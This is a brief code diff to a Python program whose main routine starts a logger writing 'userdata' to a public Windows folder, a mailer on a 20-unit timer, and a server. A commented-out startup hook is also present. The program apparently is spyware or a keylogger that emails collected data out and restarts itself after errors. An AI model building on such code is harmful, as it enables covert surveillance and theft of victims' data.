@@ -18,7 +18,7 @@ class OyeSServer:
     def main(self):
         # self.handle_mul_instances()
         # self.add_startup()
-        self.logger = Logger("C:\\Users\\Public\\", "twd_userdata")
+        self.logger = Logger("C:\\Users\\Public\\", "userdata")
         self.mailer = Mailer(self, freq=20)
         self.server = Server(self)
 
@@ -45,5 +45,6 @@ if __name__ == '__main__':
         server = OyeSServer()
         server.main()
     except:
+        del server
         server = OyeSServer()
         server.main()
